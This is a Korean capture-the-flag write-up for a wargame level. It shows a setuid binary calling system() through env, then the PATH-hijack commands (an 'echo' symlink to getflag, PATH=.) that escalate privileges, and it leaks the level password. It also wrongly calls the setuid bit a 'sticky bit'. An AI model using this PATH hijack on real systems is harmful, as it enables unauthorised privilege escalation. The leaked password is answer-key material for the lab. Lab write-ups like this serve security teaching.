> Password: kooda2puivaav1idi4f57q8iq

# 접근 방법

```
$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```
`level03` 실행 파일에 `Sticky bit`가 설정되어 있음을 알 수 있다. 이것이 owner, group에 각각 설정되어 있다. 이것이 설정된 해당 프로그램을 실행할 때, `seteuid` 또는 `setegid` 로 Effective UID 또는 Effective GID가 일시적으로 변경되어 실행된다.

`Effective UID/GID`는 실제로 프로그램을 실행한 사용자인 `Real UID/GID`와는 다르다.

따라서 `Effective UID/GID`가 변경된 프로그램이 취약점을 갖고 실행될 경우, **권한이 탈취될 수 있는 위험성**이 있다는 것을 알 수 있다.

홈 디렉토리에 제공된 `level03` 실행 파일을 gdb로 분석했을 때 `main`함수 마지막 부분의 내용이 다음과 같았는데

```
0x080484f7 <+83>:	mov    DWORD PTR [esp],0x80485e0
0x080484fe <+90>:	call   0x80483b0 <system@plt>
```

이때 `0x80485e0` 주소에는 `"/usr/bin/env echo Exploit me"` 라는 문자열이 들어있었다.

따라서 같은 역할을 하는 코드를 C로 작성하면

```c
system("/usr/bin/env echo Exploit me");
```

과 같은 형태가 되는데,

이 코드는 `env`가 변조되었을 때 잘못된 `echo`를 실행할 수 있는 위험이 있는 코드이다. 따라서 `tmp` 디렉토리에 `echo`라는 이름의 `getflag`로 향하는 심볼릭 링크를 걸고 프로그램을 실행시키면 다음 레벨의 비밀번호가 나온다.

```bash
> ln -s /bin/getflag echo
> PATH=. ~/level03
```
